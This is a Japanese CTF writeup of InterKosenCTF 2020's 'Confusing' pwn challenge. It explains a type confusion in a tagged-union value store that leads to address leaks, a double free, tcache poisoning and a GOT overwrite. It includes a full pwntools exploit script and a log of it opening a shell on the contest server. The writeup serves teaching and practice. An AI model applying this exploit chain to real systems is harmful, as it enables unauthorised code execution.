---
tags: pwn, ctf
---

# InterKosenCTF 2020 - Confusing

* 作問者Writeup(問題リポジトリに同梱): <https://github.com/theoremoon/InterKosenCTF2020-challenges/blob/master/pwn/confusing/solution/solve.py>
* 作問者感想兼軽い解説: <https://ptr-yudai.hatenablog.com/entry/2020/09/07/020405#confusing>
* これまでに解いた問題: <https://hackmd.io/@Xornet/BkemeSAhU>

## Writeup

### Outline

型(int, double, string(pointer))と値を指定して保存できる問題。intとpointerはそれぞれ32bit, 48bitあれば十分なので残り16bitがマジックナンバーとして使われ、型情報が保存されている。しかし、doubleはそれが無いので型の偽装が可能。
PIE無効なのでstringに上手く偽装したdoubleをリストで開示するとAARが出来る。
これでlibcとheapのアドレスをリークする(前者はGOTから、後者は.bssセクションにある値リストから)。
heap上にある既知のチャンクのアドレスが分かっているので同じくstringに偽装した2つの値が同じdoubleをリストに配置し、deleteすることでDouble Freeに持ち込むことが出来る。これで任意の値の書き込みが可能になったのでなんとかしてシェルを起動する。
実はこちらからの入力を与える際にstring型の中身を与えるところ以外ではチャンクの確保と`free`が発火するため`__free_hook`を直接書き換えようとすると嬉しくない値(選択肢の1(バイトにすると`b"\x31\x0a"`)等)が入りセグフォで死ぬ。そこで今回はPartial RELROなのでGOT Overwriteで`strtol`のGOTをone gadgetに書き換えて祈った。

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

### Binary

* libc: 2.27
* 保持可能ポインタ: 10
* malloc可能サイズ: ? (最初は0x80で、クソ長い文字列を与えると増えたりする???)
* コマンド
    1. set value: 型とインデックスと値を指定してリストに保存する
    2. show list: リスト中の値を全部開示する
    3. delete value: インデックスを指定して値を削除する

この問題の最大厄介ポイントがこのコマンド選択も含めあらゆる箇所で使われている`get_string`関数と`get_integer`関数である。

```c=
char *get_string(const char *msg) {
  char *ptr, *nlpos;
  size_t n = 0;
  printf("%s", msg);
  if (getline(&ptr, &n, stdin) == -1) {
    free(ptr);
    exit(0);
  }
  if (nlpos = strchr(ptr, '\n')) {
    *nlpos = '\0';
  }
  return ptr;
}
int get_integer(const char *msg) {
  char *p = get_string(msg);
  int v = atoi(p);
  free(p);
  return v;
}
```

ありとあらゆる入力に`get_string`が使われ、その度に内部で呼ばれている`getline`がHeap領域から勝手にチャンクを確保したりする。
そして`get_integer`関数も同様でこいつは呼ばれる度に使ったポインタを`free`する。
そういうわけでHeap問の定番である`__free_hook`書き換えを普通に行おうとすると「`__free_hook`書き換えのためのコマンド選択」の地点で`__free_hook`の確保(+書き込み)と`free`が発生する。一般的にコマンド選択は1,2,3のいずれかであるため`0x31, 0x32, 0x33`と改行コードが`__free_hook`に入り、その後の`get_integer`で`free`が呼ばれて関数ポインタとして不適なこいつらを呼ぼうとして死ぬ。
それならこのコマンド選択で選択肢としては不適だが、入れたいバイト列を送れば良いと考えるかもしれない(実際考えた)。
しかし、そんなことは想定済みなのか1, 2, 3以外の選択肢を受け取ると`return`し、ここはmain関数の処理なのでプログラムが終了する。
但し、それ以外のインデックスや型指定はmainに戻るだけなので選択肢部分だけ回避すれば良い(作問者Writeupはそれをしているように見える)。
じゃあ`__free_hook`を先頭におかないようにすれば良い、となるが`free`のせいでだいたいtcacheの先頭にこのクッション用のチャンクが返ってきてしまい、今度は一生`__free_hook`が書き換えられなくなる

というわけでこの回避策を考えるのが後半戦になるが長くなるのでひとまずType Confusionの説明をする。

### Type Confusion

今回保存される値は次のような構造になっている(配布ソースコードまんま)

```c=
/*
 * Do you know how WebKit keeps variables in memory?
 *
 * > The top 16-bits denote the type of the encoded JSValue:
 * >
 * >     Pointer {  0000:PPPP:PPPP:PPPP
 * >              / 0001:****:****:****
 * >     Double  {         ...
 * >              \ FFFE:****:****:****
 * >     Integer {  FFFF:0000:IIII:IIII
 *
 * How smart it is! I implemented this structure in C :)
 * I hope I made it right......
 *
 * Read the following code for more information:
 *  - https://github.com/adobe/webkit/blob/master/Source/JavaScriptCore/runtime/JSValue.h
 */

#define VALUE_UNDEFINED ((void*)0x0a)
#define MAGIC_STRING  0x0000
#define MAGIC_INTEGER 0xFFFF

/* A magic type that can keep string, double and integer! */
typedef union __attribute__((packed)) {
  char *String;
  double Double;
  int Integer;
  struct __attribute__((packed)) {
    unsigned long  data : 48;
    unsigned short magic: 16;
  } data;
} Value;

void Value_SetUndefined(Value *v) {
  v->String = VALUE_UNDEFINED;
}
void Value_SetString(Value *v, char *p) {
  v->String = p;
}
void Value_SetDouble(Value *v, double d) {
  v->Double = d;
}
void Value_SetInteger(Value *v, int i) {
  v->Integer = i;
  v->data.magic = MAGIC_INTEGER;
}

int Value_IsUndefined(Value v) {
  return v.String == VALUE_UNDEFINED;
}
int Value_IsString(Value v) {
  return (v.data.magic == MAGIC_STRING) && (!Value_IsUndefined(v));
}
int Value_IsInteger(Value v) {
  return v.data.magic == MAGIC_INTEGER;
}
int Value_IsDouble(Value v) {
  return !(Value_IsUndefined(v) || Value_IsString(v) || Value_IsInteger(v));
}

```

共用体を利用してString, Double, Integerの型のどれが来ても値と方が保存出来るようになっている。
StringとInteger(とUndefined)はマジックナンバーで特定しており、そうでないものがDouble型となる。
ということはこのマジックナンバー部分を含むようなDouble型を与えるとDouble型として送ったにも関わらずString型として扱うことが出来る。
[ここのサイト](https://gregstoll.dyndns.org/~gregstoll/floattohex/)で適当な16進値(0xdeadbeef等)を与えてみると該当するdouble型の数値が得られる。

この問題ではString型の実体はポインタでshow機能でその指す先を見ることが出来た。ということはDoubleとして送り、Stringとみなされた数値がアドレスとして有効ならそこを覗く事が出来る。これを利用してlibcとHeapのアドレスはリーク出来る。
前者はGOTを覗けば良く(PIE無効なのでGOTのアドレスは分かっている)、後者は.bssセクションで管理されている値のリストでString型(Heap領域上のポインタ)が置かれている場所を覗けば良い。

### Double Free

Type Confusionのおかげで出来るのはAARだけでは無い。Double型を通じて、任意のアドレスをString型(ポインタ)としてリストにおけるようになるので実質任意アドレスのfreeが出来る。
これは`delete`関数で行われており次のようになっている。

```c=
void delete(void) {
  unsigned int index, type;

  index = get_integer("index: ");
  if (index >= NUM_ELEMENT) {
    puts("Wrong index :(");
    return;
  }

  if (Value_IsString(list[index]))
    free(list[index].String);

  Value_SetUndefined(&list[index]);
  puts("[+] Successfully deleted value");
}
```

ここで`Value_SetUndefined`が有るため、同じインデックスを2度deleteで指定してDouble Freeという事はおそらく出来ない。しかし違うインデックスで同じアドレスを指すポインタを用意しておけばどちらもdeleteすることでDouble Freeが出来る。
今回は事前にString型として仕込んだポインタが指す先を調べておき、そこと同じ値になるようなDouble型を計算して型を偽装した。

これでtcache poisoningが出来るのでサイズ0x80のtcacheの先頭に書き込みたいアドレスが来るようにする。
但し、前述したように`__free_hook`を直接書き換えるのは`get_integer`中の`free`が走って終わるのでちょっと上を`"/bin/sh\x00"`に書き換えるついでにその下にある`__free_hook`にsystem関数のアドレスを同時に入れる等の工夫が居る。

一方私は、運に任せてPartial RELROであることを利用して`get_integer`中で呼ばれている`atoi`(実際は`strtol`)のGOTをOne Gadgetで書き換える事にした。
無事に刺さって良かったです。

## Code

```python=
import struct
import binascii
from pwn import p64, u64, ELF, process, remote
from xlog import XLog


logger = XLog("EXPLOIT")


# you need filling this variables
PROMPT_CHAR = "> "
CREATE_NUM = 1
EDIT_NUM = None
DELETE_NUM = 3
SHOW_NUM = 2


def select(s, sel, c=PROMPT_CHAR):
    if sel is None or c is None:
        logger.warning("please fill above variables")
        exit(-1)
    s.recvuntil(c)
    s.sendline(str(sel))


# heap commands
def create(s, i, _type, data):
    select(s, CREATE_NUM)
    s.recvuntil("index: ")
    s.sendline(str(i))
    s.recvuntil("type (1=String / 2=Double / 3=Integer): ")
    s.sendline(str(_type))
    s.recvuntil("data: ")
    s.sendline(data)


def delete(s, i):
    select(s, DELETE_NUM)
    s.recvuntil("index: ")
    s.sendline(str(i))


def show(s, i):
    select(s, SHOW_NUM)
    s.recvuntil(f"{i}: [")
    _type = s.recvuntil("]")[:-1]
    s.recvuntil(' "')
    res = s.recvline()[:-2]

    return res


def hex_to_double(n):
    s = hex(n)[2:]
    s = s.rjust(16, "0")
    return str(struct.unpack('>d', binascii.unhexlify(s))[0])


if __name__ == "__main__":
    elf = ELF("chall")
    # libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    libc = ELF("libc-2.27.so")

    free_hook_libc = libc.symbols["__free_hook"]
    malloc_hook_libc = libc.symbols["__malloc_hook"]
    system_libc = libc.symbols["system"]

    setbuf_got = elf.got["setbuf"]  #  0x602030
    atoi_got = elf.got["strtol"]

    # onegadgets = [0x4f2c5, 0x4f322, 0x10a38c]
    onegadgets = [0x4f365, 0x4f3c2, 0x10a45c]

    # s = process(elf.path)
    s = remote("pwn.kosenctf.com", 9005)

    # libc leak
    """
        from: https://gregstoll.dyndns.org/~gregstoll/floattohex/
    """
    setbuf_got_double = "3.1124634e-317"
    create(s, 0, 2, setbuf_got_double)
    libc_addr = u64(show(s, 0).ljust(8, b"\x00")) - libc.symbols["setbuf"]
    logger.libc(libc_addr)

    # heap leak
    string_p_double = "3.1125227e-317"
    create(s, 1, 1, "/bin/sh")
    create(s, 2, 2, string_p_double)
    heap_addr = u64(show(s, 2).ljust(8, b"\x00")) - 0x260
    logger.heap(heap_addr)

    # tcache poisoning
    target_addr = heap_addr + 0x260
    free_hook_addr = libc_addr + free_hook_libc
    system_addr = libc_addr + system_libc
    create(s, 3, 2, hex_to_double(target_addr))
    delete(s, 1)
    delete(s, 3)
    create(s, 4, 1, p64(atoi_got))
    create(s, 5, 1, "unko")
    s.recvuntil(b"> ")
    s.sendline(p64(libc_addr + onegadgets[2]))

    s.interactive()

```

## Flag

当日はチームメイトが解きましたが、鯖が動いていたので終了後に自力で解きました

`KosenCTF{add_0x2000000000000_to_double_precision_values}`

Exploitの実行結果はこちら

```
$ xplt
[*] '/mnt/c/share/CTF/interkosen2020/confusing/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[*] '/mnt/c/share/CTF/interkosen2020/confusing/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.kosenctf.com on port 9005: Done
[EXPLOIT][+]: libc address -> 0x7f47db17d000
[EXPLOIT][+]: heap address -> 0x17ad000
[*] Switching to interactive mode
$ ls
chall
flag-1bdc5727ec49424f60f9e73ade834db6.txt
redir.sh
$ cat flag-1bdc5727ec49424f60f9e73ade834db6.txt
KosenCTF{add_0x2000000000000_to_double_precision_values}
```

## 感想

Type Confusion要素はめちゃくちゃ面白かったです。Browser ExploitがType Confusionが多いとの事で挑戦してみたくなりましたし、ユーザーランドのELF問題でもこういう形式が増えて欲しいです。
が、freeの起こるタイミングのコントロールが難しくHeapパートは大変でした。
C++問題でも`string`型のせいでHeap領域を掻き乱されたり等、この手の裏で行われているmallocにはいい思い出があまり無いですが、問題に触れるのを繰り返してこういうのに慣れていけたら嬉しいです。

解き終わった後に当日解いたチームメイトに聞いたら`__free_hook`の手前から書き込んで`free`するポインタは`"/bin/sh"`を指すようにし、同時に`__free_hook`に`system`のアドレスを入れて落ちる事を回避していたらしい、天才か?
作問者Writeupはサイズの偽装を行ってうまい具合に`__free_hook`に嫌な値が入るのを防いでいました、天才か?